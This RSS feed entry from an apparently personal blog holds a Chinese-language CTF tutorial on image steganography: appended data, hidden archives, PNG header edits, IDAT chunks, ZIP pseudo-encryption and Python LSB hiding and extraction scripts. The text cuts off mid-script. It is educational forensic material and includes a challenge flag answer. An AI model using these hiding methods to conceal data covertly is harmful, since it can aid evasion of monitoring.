<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>yym&#39;s blog</title>
    <link>http://yoursite.com/</link>
    
    <atom:link href="/rss2.html" rel="self" type="application/rss+xml"/>
    
    <description>hello world</description>
    <pubDate>Sun, 21 Jun 2020 06:50:44 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Misc-隐写术总结</title>
      <link>http://yoursite.com/undefined/Misc%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/</link>
      <guid>http://yoursite.com/undefined/Misc%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/</guid>
      <pubDate>Sun, 14 Jun 2020 07:37:00 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;Misc-隐写术总结&quot;&gt;&lt;a href=&quot;#Misc-隐写术总结&quot; class=&quot;headerlink&quot; title=&quot;Misc-隐写术总结&quot;&gt;&lt;/a&gt;Misc-隐写术总结&lt;/h1&gt;&lt;h2 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;head
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Misc-隐写术总结"><a href="#Misc-隐写术总结" class="headerlink" title="Misc-隐写术总结"></a>Misc-隐写术总结</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>隐写术是关于信息隐藏，即不让计划的接收者之外的任何人知道信息的传递事件（而不只是信息的内容）的一门技巧与科学,英文写作Steganography。而密码编码是关于信息加密，即设想到信息可能会被接受者之外的第三方获取而采取的一种措施，通过通信双方预先设定的规则对信息进行加密，使第三方即使获取到信息也无法理解其含义。所以隐写术重点在于信息的隐藏，密码编码重点在于信息的加密，这两者属于完全不同的概念。</p><p>[TOC]</p><h3 id="图片隐写术"><a href="#图片隐写术" class="headerlink" title="图片隐写术"></a>图片隐写术</h3><p>图片隐写术大致分为下列六类</p><ul><li><p>一、附加式的图片隐写</p></li><li><p>二、基于文件结构的图片隐写</p></li><li><p>三、基于LSB原理的图片隐写</p></li><li><p>四、基于DCT域的JPG图片隐写</p></li><li><p>五、数字水印的隐写</p></li><li><p>六、图片容差的隐写</p></li><li><p>其他</p></li></ul><hr><h4 id="一、附加式的图片隐写"><a href="#一、附加式的图片隐写" class="headerlink" title="一、附加式的图片隐写"></a>一、附加式的图片隐写</h4><h5 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h5><p>附加式的图片隐写通常是我们用某种程序或者方法在图片文件上直接附加被隐写的目标。</p><p>程序识别图片的过程是，从文件标识头开始，以文件标识头声明的文件格式所定义的编码格式对数据流进行读取，一直到图片的结束符，当图片处理程序识别到图片的结束符后，不再继续向下识别，所以我们就可以通过在图片结束符后添加数据达到隐写的目的。</p><p><strong>附加式图片隐写分类：</strong></p><ul><li>A丶附加字符串</li><li>B丶图种</li></ul><h5 id="A丶附加字符串"><a href="#A丶附加字符串" class="headerlink" title="A丶附加字符串"></a>A丶附加字符串</h5><p>利用工具将隐藏信息直接写入到图片结束符之后</p><p><strong>解法：</strong></p><p>strings工具扫描/将图片后缀改为<code>.txt</code>文件，打开查看末尾添加的字符串</p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 正如前文所说，我们这个实验部分讲的是附加字符串的隐写方式，所以我们用Strings检查一下图片</span><br><span class="line">- 在Strings工具的搜索下，就能得到隐藏在图片末尾的字符串</span><br><span class="line">&#x2F;&#x2F;也有可能是经过编码或者加密过后的字符串</span><br></pre></td></tr></table></figure><p><strong>strings使用方法</strong></p><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p><p>选项：</p><ul><li>-a –all：扫描整个文件而不是只扫描目标文件初始化和装载段</li></ul><ul><li>-f –print-file-name：在显示字符串前先显示文件名</li><li>-t –radix={o,d,x} ：输出字符的位置，基于八进制，十进制或者十六进制</li><li>-e –encoding={s,S,b,l,B,L} ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit</li></ul><p><strong>Tips  我们使用strings + 文件名字的命令即可</strong></p><p><strong>具体步骤如下：</strong></p><p>在kali中输入命令+文件名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings &#x2F;root&#x2F;桌面&#x2F;11111.jpg</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/x4yP9XTFCOzRnkG.png" alt="image-20200611150413169"></p><p>有必要提到的是，为什么字符串要附加在文件的后面呢?那是因为，如果图片附加在中间，有可能破坏了图片的信息，如果字符串附加在图片的头部位置，又破坏了文件头，可能导致图片无法识别。关于文件格式的具体内容，我们下一个部分的隐写还会提到。</p><h5 id="B丶图种"><a href="#B丶图种" class="headerlink" title="B丶图种"></a>B丶图种</h5><p>一种采用特殊方式将图片文件（如jpg格式）与rar文件结合起来的文件。该文件一般保存为jpg格式，可以正常显示图片；</p><p><strong>解法：</strong></p><ul><li>可以修改文件的后缀名，将图片改为rar压缩文件，并得到其中的数据。</li><li>binwalk / foremost分离</li></ul><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 对图片进行检测，确认是不是图种</span><br><span class="line">- 使用binwalk&#x2F;formost分离图片，得到一个压缩包</span><br><span class="line">- 打开压缩包得到flag。</span><br></pre></td></tr></table></figure><p>简单的检测方式:</p><p>打开工具中的binwalk。使用如下命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk cqzb.jpg</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/ksW5dyzS9hJjntE.png" alt="image-20200611162616711"></p><p>我们可以发现，binwalk自动识别出来了zip文件，而且偏移也告诉我们了,当然我们这里可以使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e &#x2F;root&#x2F;桌面&#x2F;cqzb.jpg</span><br></pre></td></tr></table></figure><p>这个命令可以提取出binwalk检测出来的文件</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/jIsvnfW5R3oiltL.png" alt="image-20200611162954920"></p><p> 但是这里也可以通过另一种方式去提取压缩包，从原理上去提取。这里介绍一个工具<code>winhex16进制编辑器</code>，当然也可以使用其他的16进制编辑器。</p><p><strong>使用winhex16进制编辑器提取ZIP文件</strong></p><p>首先需要了解一下什么是文件头</p><p>文件头就是位于文件开头的一段标识文件类型的数据块</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/UQPuHLDokX84Sth.png" alt="image-20200611213803814"></p><p>如上图的FF D8 FF就是JPG图片的文件头，一般当我们看到文件开头是如此的格式，我们就能认为这是一个JPG图片了。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/fH3NKpulMb2Aaqy.png" alt="image-20200611214620664"></p><p>一般JPG的文件尾以FFD9结尾</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/3FryjsmvewA4Zfx.png" alt="image-20200611214339008"></p><p>上图 50 4B 03 04就是ZIP文件的文件头，一般以PK表示。</p><p>上文我们讲述了，JPG图片的结束标识是FF D9,ZIP文件的文件头是50 4B 03 04，我们只需要在winhex中找到ZIP文件的文件头即可，滑动滚条到最底下。上文讲了一般附加的位置是在原本文件的后面，所以我们果断滑动滚动条到最后。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/rvZlJpfQgFzG7VH.png" alt="image-20200611214741860"></p><p>明显此图不是以FF D9结尾，而且在上面发现了ZIP文件的文件头50 4B 03 04，所以不使用binwalk也能判断这是个图种文件。然后接下来我们就需要分离ZIP文件了。</p><p><strong>分离ZIP文件</strong></p><p>选取从文件头开始到文件尾的所有数据，以16进制数复制到新建的文件中。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/enzkJP9V8q7K3i5.png" alt="image-20200611215154084"></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/18LJvrK2Psy9Wpt.png" alt="image-20200611215317247"></p><p>然后保存就能得到zip文件。</p><hr><h4 id="二、基于文件结构的图片隐写"><a href="#二、基于文件结构的图片隐写" class="headerlink" title="二、基于文件结构的图片隐写"></a>二、基于文件结构的图片隐写</h4><h5 id="背景知识："><a href="#背景知识：" class="headerlink" title="背景知识："></a>背景知识：</h5><p>这里的文件结构特指的是图片文件的文件结构。我们这里主要讲的也是PNG图片的文件结构。CTF比赛中也是以PNG图片的隐写为主。</p><p>PNG文件结构很简单，主要由数据块组成，最少包含4个数据块。</p><p>PNG数据块PNG图片有两种数据块的，一种是关键数据块，另一种是辅助数据块。</p><p>正常的关键数据块，定义了4种标准数据块，分别是<font color=red>长度，数据块类型码，数据块数据，循环冗余检测(CRC )</font>font&gt;，每个PNG文件都必须包含它们。</p><table><thead><tr><th>PNG标识符</th><th>PNG文件头数据块（IHDR）</th><th>PNG数据块</th><th>…</th><th align="left">PNG结尾数据块(IEND)</th></tr></thead><tbody><tr><td>89504E470D0A1A0A</td><td>IHDR中，包括了图片的宽，高，图像深度，颜色类型，压缩方法等等。</td><td>IDAT 数据块、辅助数据块</td><td></td><td align="left">000000004945 4E44AE426082</td></tr></tbody></table><ul><li>PNG标识符<code>89504E470D0A1A0A</code>总是在文件头部，用于标识这是一个PNG图片。</li><li>PNG文件头数据块IHDR，它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</li><li>PNG数据块IDAT，它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</li><li>PNG结束数据块IEND：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</li></ul><p><strong>IHDR数据块构成：</strong></p><table><thead><tr><th><strong>域的名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度：  索引彩色图像：1，2，4或8  灰度图像：1，2，4，8或16  真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型： 0：灰度图像, 1，2，4，8或16  2：真彩色图像，8或16  3：索引彩色图像，1，2，4或8  4：带α通道数据的灰度图像，8或16  6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法： 0：非隔行扫描  1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><p>这里我们需要重点关注的是宽和高的数据</p><p><strong>首先举个例子：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/f2m5RXLUjCukob7.png" alt="image-20200611223017816"></p><p><strong>PNG标识符：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">89504E470D0A1A0A</span><br></pre></td></tr></table></figure><p>表示这是一个PNG文件</p><p><strong>接下来是IHDR数据块</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 0D</span><br><span class="line">&#x2F;&#x2F;表示IHDR头快长度为13(16进制编辑器，D表示13)</span><br><span class="line">49 48 44 52</span><br><span class="line">&#x2F;&#x2F;IHDR标识，表示这是一个IHDR数据块</span><br><span class="line">00 00 03 E8 </span><br><span class="line">&#x2F;&#x2F;表示PNG图像的宽，16^2*3+16^1*14+16^0*8&#x3D;1000像素</span><br><span class="line">00 00 02 32 </span><br><span class="line">&#x2F;&#x2F;表示PNG图像的高，16^2*2+16^1*3+16^0*2&#x3D;562像素</span><br><span class="line">08 </span><br><span class="line">&#x2F;&#x2F;表示图像深度，这里是2^8&#x3D;256，即这是一个256色的图像</span><br><span class="line">06 </span><br><span class="line">&#x2F;&#x2F;颜色类型，查表可知这是带α通道数据的真彩色图像</span><br><span class="line">00</span><br><span class="line">&#x2F;&#x2F;压缩方法</span><br><span class="line">00 </span><br><span class="line">&#x2F;&#x2F;PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法（LZ77派生 算法）</span><br><span class="line">00</span><br><span class="line">&#x2F;&#x2F;滤波器方法</span><br><span class="line">58 71 E0 19</span><br><span class="line">&#x2F;&#x2F;CRC校验</span><br></pre></td></tr></table></figure><p>接下来的是不重要的数据块，我们只需要知道知道再之后就会有IDAT数据块</p><p><strong>IDAT数据块</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/szkZJOCmnRvrhfH.png" alt="image-20200611230506506"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 8A</span><br><span class="line">&#x2F;&#x2F;表示IDAT数据块的长度为8A&#x3D;16^1*8+16^0*10&#x3D;138字节</span><br><span class="line">49 44 41 54</span><br><span class="line">&#x2F;&#x2F;IDAT数据块标识符,表示这是一个IDAT数据块</span><br><span class="line">接下去的数据是真正的数据</span><br><span class="line">D9 CF A5 A8 </span><br><span class="line">&#x2F;&#x2F;CRC校验码</span><br></pre></td></tr></table></figure><h5 id="常用工具："><a href="#常用工具：" class="headerlink" title="常用工具："></a>常用工具：</h5><ul><li>winhex</li><li>010Editor</li><li>pngcheck</li><li>binwalk</li></ul><p><strong>基于文件结构的图片隐写分类：</strong></p><ul><li>高度被修改引起的隐写</li><li>隐写信息以IDAT块加入图片</li></ul><h5 id="A-高度被修改引起的隐写"><a href="#A-高度被修改引起的隐写" class="headerlink" title="A.高度被修改引起的隐写"></a>A.高度被修改引起的隐写</h5><p>背景知识中，我们了解到，图片的高度，宽度的值存放于PNG图片的IHDR数据块，那么我们就是可以通过修改PNG图片的高度值，来对部分信息进行隐藏的。</p><p><strong>解法：</strong></p><p>使用winhex或010Editor等16进制编辑器修改图片高度，调大一点</p><p><strong>技巧：</strong></p><p>一般的高度修改的图片不会修改IHDR的CRC校验码，在windows下，不会检查CRC校验码，图片能正常显示，但在Linux下，图片查看器会检查图片的CRC校验码，所以可以将图片拖入到Linux中去查看校验</p><p>当然可能会把CRC校验码也重新计算过，就不能用这种方法了。</p><p>这里介绍一款工具，能计算CRC校验码：</p><p><strong>CRC Calculator</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/ANukZKTzxjcHeYX.png" alt="image-20200612133558161"></p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 正如前文所说，我们这个实验部分讲的是图片高度值被修改引起的的隐写方式，所以我们winhex</span><br><span class="line">- 在winhex运行PNG图片，这样方便于我们修改PNG图片的高度值</span><br><span class="line">- 找到PNG图片高度值对应的地方，然后修改为一个较大的值，并保存文件</span><br><span class="line">- 打开保存后的图片，发现底部看到了之前被隐写的信息</span><br></pre></td></tr></table></figure><p>原图：<img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612132510439.png" alt="image-20200612132510439"></p><p>修改高度</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612132547621.png" alt="image-20200612132547621"></p><p>修改为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 02 FF</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612132759250.png" alt="image-20200612132759250"></p><p><strong>思考：</strong></p><ol><li>如果修改的是宽度该怎么修复呢？                  ————————–通过爆破未被修改的CRC校验码得到原始宽度</li><li>JPG图片是否也有这样的隐写形式呢？</li><li>了解JPG以及GIF等图片文件的格式。</li></ol><h5 id="B-隐写信息以IDAT块加入图片"><a href="#B-隐写信息以IDAT块加入图片" class="headerlink" title="B.隐写信息以IDAT块加入图片"></a>B.隐写信息以IDAT块加入图片</h5><p>在背景知识中，我们提到了一个重要的概念就是图片的IDAT块是可以存在多个的，这导致了我们可以将隐写信息以IDAT块的形式加入图片。</p><p>这里再次提一下IDAT数据块的格式：</p><table><thead><tr><th align="left">IDAT数据块长度</th><th align="left">IDAT数据块标识</th><th align="left">IDAT数据</th><th align="left">CRC校验码</th></tr></thead><tbody><tr><td align="left">00 00 00 B3</td><td align="left">49 44 41 54</td><td align="left">50 4B …….00 00</td><td align="left">24 9B 7C 31</td></tr></tbody></table><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612135623777.png" alt="image-20200612135623777"></p><p><strong>解法：</strong></p><p>首先可以通过<code>pngcheck</code>检测是否有异常的数据块，一般的IDAT数据块都是连续的数据块。</p><p>然后查看偏移量找到数据块的位置，提取IDAT数据块进行分析</p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 使用pngcheck先对图片检测</span><br><span class="line">- 在pngcheck的检测下，我们会发现异常信息，我们对异常的块进行提取</span><br><span class="line">- 查看数据块偏移量，找到IDAT数据块</span><br><span class="line">- 提取数据块</span><br><span class="line">- 分析数据块</span><br></pre></td></tr></table></figure><p><strong>前景知识</strong><br>pngcheck可以验证PNG图片的完整性（通过检查内部CRC-32校验和&bra;比特&ket;)和解压缩图像数据；它能够转储几乎所有任选的块级别信息在该图像中的可读数据。<br>我们使用<code>pngcheck -v xxx.png</code>如此的命令对图片进行检测</p><p><strong>使用pngcheck对图片进行检测</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/3HJW2Zj9ScwreLn.png" alt="image-20200612141052876"></p><p>可以发现原本连续的数据块都是32768的大小，然后15871，然后后面还有一个179大小的数据块，说明这个数据块有异常。</p><p><strong>提取数据块</strong></p><p>将数据块内容复制粘贴到新的文件中</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/GJOfTlxgCrLqt6V.png" alt="image-20200612141345571"></p><p><strong>分析数据块：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/A5eu2Hsc7n3NwEg.png" alt="image-20200612141439513"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">50 4B 03 04</span><br></pre></td></tr></table></figure><p>说明这是一个ZIP压缩包，改后缀名得到zip文件</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/ZEBcTWJiazyG9qV.png" alt="image-20200612141914384"></p><p>发现提示需要密码，由于题目没有更多信息提示，所以先检查ZIP文件格式，查看压缩包是否是伪加密</p><p>提示：伪加密的压缩包可以用360压缩打开，也可以修复压缩包的方法打开或者修改数据；</p><p>伪加密是通过将第二个14后面的00 00 修改为14 00 09实现，只要将09修改成00就能破解，具体原理可以搜索zip伪加密实现</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612143639110.png" alt="image-20200612143639110"></p><p><em>思考</em></p><ol><li>我们是否可以将一张二维码以IDAT块的形式写入图片呢？</li><li>试着自己将信息以IDAT块的形式写入图片—————–需要添加长度和CRC校验</li></ol><hr><h4 id="三、基于LSB原理的图片隐写"><a href="#三、基于LSB原理的图片隐写" class="headerlink" title="三、基于LSB原理的图片隐写"></a>三、基于LSB原理的图片隐写</h4><h5 id="背景知识-1"><a href="#背景知识-1" class="headerlink" title="背景知识"></a>背景知识</h5><p>网络上有很多博文抄来抄去也写的不清楚，然后我也找了很久才搞懂。</p><p>LSB，最低有效位。我们知道图像像素一般是由RGB三原色（即红绿蓝）组成的，每一种颜色占用8位，0x00~0xFF，即一共有256种颜色，一共包含了256的3次方的颜色，颜色太多，而人的肉眼能区分的只有其中一小部分，这导致了当我们修改RGB颜色分量中最低的二进制位的时候，我们的肉眼是区分不出来的</p><p>三原色，每种颜色占8位</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 0   0   0   0   |   0   0   0   0</span><br><span class="line">2^7      ...........        2^1 2^0</span><br><span class="line">&#x2F;&#x2F;一原色就一共有2^8&#x3D;256种颜色，三原色就是256^3种颜色</span><br><span class="line">当我们修改每种颜色的最低位二进制位2^0时，我们的肉眼区分不出来，所以就可以通过修改最低位达到隐写数据的目的</span><br></pre></td></tr></table></figure><p><strong>出题思路：</strong></p><ul><li>可以通过对某一颜色的某一个二进制位进行存储0或1 ，存储成这一通道(即二进制位)的黑白图片</li><li>可以在三个颜色通道的最低有效位存储0或1数据，存入图片数据或者其他数据</li></ul><h5 id="常用工具：-1"><a href="#常用工具：-1" class="headerlink" title="常用工具："></a>常用工具：</h5><ul><li>Stegosolve</li></ul><p><strong>Stegosolve介绍</strong><br>CTF中，最常用来检测LSB隐写痕迹的工具是Stegsolve，这是一款可以对图片进行多种操作的工具，包括对图片进行xor,sub等操作，对图片不同通道进行查看等功能。</p><p><strong>基于LSB原理的图片隐写</strong></p><ul><li>简单的LSB隐写</li><li>有一点难度的LSB隐写</li></ul><h5 id="A-简单的LSB隐写"><a href="#A-简单的LSB隐写" class="headerlink" title="A.简单的LSB隐写"></a>A.简单的LSB隐写</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 使用Stegsolve打开图片，在不同的通道查看图片</span><br><span class="line">- 在通道切换的过程中，我们看到了flag</span><br><span class="line">- 最后的flag是flag:key&#123;forensics_is_fun&#125;</span><br></pre></td></tr></table></figure><p>用Stegsolve打开图片，并在不同的通道中切换</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612150014122.png" alt="image-20200612150014122"></p><p>最后在发现Red的2^0位上隐写了数据</p><p>flag是flag:key{forensics_is_fun}</p><p><strong>思考</strong></p><ol><li>我们如何实现这种LSB隐写的？是否可以通过photoshop这样的工具实现？</li><li>查阅更多关于LSB隐写的资料。</li></ol><h5 id="B-有一点难度的LSB隐写"><a href="#B-有一点难度的LSB隐写" class="headerlink" title="B.有一点难度的LSB隐写"></a>B.有一点难度的LSB隐写</h5><p>我们从第一个部分可以知道，最简单的隐写我们只需要通过工具Stegsolve切换到不同通道，我们就可以直接看到隐写内容了，那么更复杂一点就不是这么直接了，而是只能用工具来查看LSB的隐写痕迹，再通过工具或者脚本的方式提取隐写信息。</p><p>可以通过Stegsolve来查看最低有效位数据：</p><p>也可以进行导出</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Analyse中的Data Extract模块</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/k9tZ23uTpOe8Qma.png" alt="image-20200612154608945"></p><p><strong>python脚本实现最低有效位隐藏算法：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from PIL import Image</span><br><span class="line">def plus(str):</span><br><span class="line">      #Python zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。</span><br><span class="line">    return str.zfill(8) </span><br><span class="line">def get_key(strr):</span><br><span class="line">      #获取要隐藏的文件内容</span><br><span class="line">    tmp &#x3D; strr</span><br><span class="line">    f &#x3D; file(tmp,&quot;rb&quot;)</span><br><span class="line">    str &#x3D; &quot;&quot;</span><br><span class="line">    s &#x3D; f.read()</span><br><span class="line">    for i in range(len(s)):</span><br><span class="line">         #逐个字节将要隐藏的文件内容转换为二进制，并拼接起来</span><br><span class="line">         #1.先用ord()函数将s的内容逐个转换为ascii码</span><br><span class="line">         #2.使用bin()函数将十进制的ascii码转换为二进制</span><br><span class="line">         #3.由于bin()函数转换二进制后，二进制字符串的前面会有&quot;0b&quot;来表示这个字符串是二进制形式，所以用replace()替换为空</span><br><span class="line">         #4.又由于ascii码转换二进制后是七位，而正常情况下每个字符由8位二进制组成，所以使用自定义函数plus将其填充为8位</span><br><span class="line">        str &#x3D; str+plus(bin(ord(s[i])).replace(&#39;0b&#39;,&#39;&#39;))</span><br><span class="line">        #print str</span><br><span class="line">    f.closed</span><br><span class="line">    return str</span><br><span class="line">def mod(x,y):</span><br><span class="line">    return x%y;</span><br><span class="line">#str1为载体图片路径，str2为隐写文件，str3为加密图片保存的路径</span><br><span class="line">def func(str1,str2,str3):  </span><br><span class="line">    im &#x3D; Image.open(str1)</span><br><span class="line">    #获取图片的宽和高</span><br><span class="line">    width &#x3D; im.size[0]</span><br><span class="line">    print &quot;width:&quot;+str(width)+&quot;\n&quot;</span><br><span class="line">    height &#x3D; im.size[1]</span><br><span class="line">    print &quot;height:&quot;+str(height)+&quot;\n&quot;</span><br><span class="line">    count &#x3D; 0</span><br><span class="line">    #获取需要隐藏的信息</span><br><span class="line">    key &#x3D; get_key(str2)</span><br><span class="line">    keylen &#x3D; len(key)</span><br><span class="line">    for h in range(0,height):</span><br><span class="line">        for w in range(0,width):</span><br><span class="line">            pixel &#x3D; im.getpixel((w,h))</span><br><span class="line">            a&#x3D;pixel[0]</span><br><span class="line">            b&#x3D;pixel[1]</span><br><span class="line">            c&#x3D;pixel[2]</span><br><span class="line">            if count &#x3D;&#x3D; keylen:</span><br><span class="line">                break</span><br><span class="line">            #下面的操作是将信息隐藏进去</span><br><span class="line">            #分别将每个像素点的RGB值余2，这样可以去掉最低位的值</span><br><span class="line">            #再从需要隐藏的信息中取出一位，转换为整型</span><br><span class="line">            #两值相加，就把信息隐藏起来了</span><br><span class="line">            a&#x3D; a-mod(a,2)+int(key[count])</span><br><span class="line">            count+&#x3D;1</span><br><span class="line">            if count &#x3D;&#x3D; keylen:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">                break</span><br><span class="line">            b &#x3D;b-mod(b,2)+int(key[count])</span><br><span class="line">            count+&#x3D;1</span><br><span class="line">            if count &#x3D;&#x3D; keylen:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">                break</span><br><span class="line">            c&#x3D; c-mod(c,2)+int(key[count])</span><br><span class="line">            count+&#x3D;1</span><br><span class="line">            if count &#x3D;&#x3D; keylen:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">                break</span><br><span class="line">            if count % 3 &#x3D;&#x3D; 0:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">    im.save(str3)</span><br><span class="line">#原图</span><br><span class="line">old &#x3D; &quot;C:\Users\yiming\Desktop\heetian.png&quot;</span><br><span class="line">#处理后输出的图片路径</span><br><span class="line">new &#x3D; &quot;C:\Users\yiming\Desktop\heetian_LSB.png&quot;</span><br><span class="line">#需要隐藏的信息</span><br><span class="line">enc &#x3D; &quot;C:\Users\yiming\Desktop\flag.txt&quot;</span><br><span class="line">func(old,enc,new)</span><br></pre></td></tr></table></figure><p><strong>python最低有效位提取脚本</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">from PIL import Image</span><br><span class="line">def mod(x,y):</span><br><span class="line">    return x%y;</span><br><span class="line">def toasc(strr):</span><br><span class="line">    return int(strr, 2)</span><br><span class="line">#le为所要提取的信息的长度，str1为加密载体图片的路径，str2为提取文件的保存路径</span><br><span class="line">def func(le,str1,str2):</span><br><span class="line">    a&#x3D;&quot;&quot;</span><br><span class="line">    b&#x3D;&quot;&quot;</span><br><span class="line">    im &#x3D; Image.open(str1)</span><br><span class="line">    lenth &#x3D; le*8</span><br><span class="line">    width &#x3D; im.size[0]</span><br><span class="line">    height &#x3D; im.size[1]</span><br><span class="line">    count &#x3D; 0</span><br><span class="line">    for h in range(0, height):</span><br><span class="line">        for w in range(0, width):</span><br><span class="line">             #获得(w,h)点像素的值</span><br><span class="line">            pixel &#x3D; im.getpixel((w, h))</span><br><span class="line">            #此处余3，依次从R、G、B三个颜色通道获得最低位的隐藏信息</span><br><span class="line">            if count%3&#x3D;&#x3D;0:</span><br><span class="line">                count+&#x3D;1</span><br><span class="line">                b&#x3D;b+str((mod(int(pixel[0]),2)))</span><br><span class="line">                if count &#x3D;&#x3D;lenth:</span><br><span class="line">                    break</span><br><span class="line">            if count%3&#x3D;&#x3D;1:</span><br><span class="line">                count+&#x3D;1</span><br><span class="line">                b&#x3D;b+str((mod(int(pixel[1]),2)))</span><br><span class="line">                if count &#x3D;&#x3D;lenth:</span><br><span class="line">                    break</span><br><span class="line">            if count%3&#x3D;&#x3D;2:</span><br><span class="line">                count+&#x3D;1</span><br><span class="line">                b&#x3D;b+str((mod(int(pixel[2]),2)))</span><br><span class="line">                if count &#x3D;&#x3D;lenth:</span><br><span class="line">                    break</span><br><span class="line">        if count &#x3D;&#x3D; lenth:</span><br><span class="line">            break</span><br><span class="line">    with open(str2,&quot;wb&quot;) as f:</span><br><span class="line">        for i in range(0,len(b),8):</span><br><span class="line">             #以每8位为一组二进制，转换为十进制</span><br><span class="line">            stra &#x3D; toasc(b[i:i+8])</span><br><span class="line">            #将转换后的十进制数视为ascii码，再转换为字符串写入到文件中</span><br><span class="line">            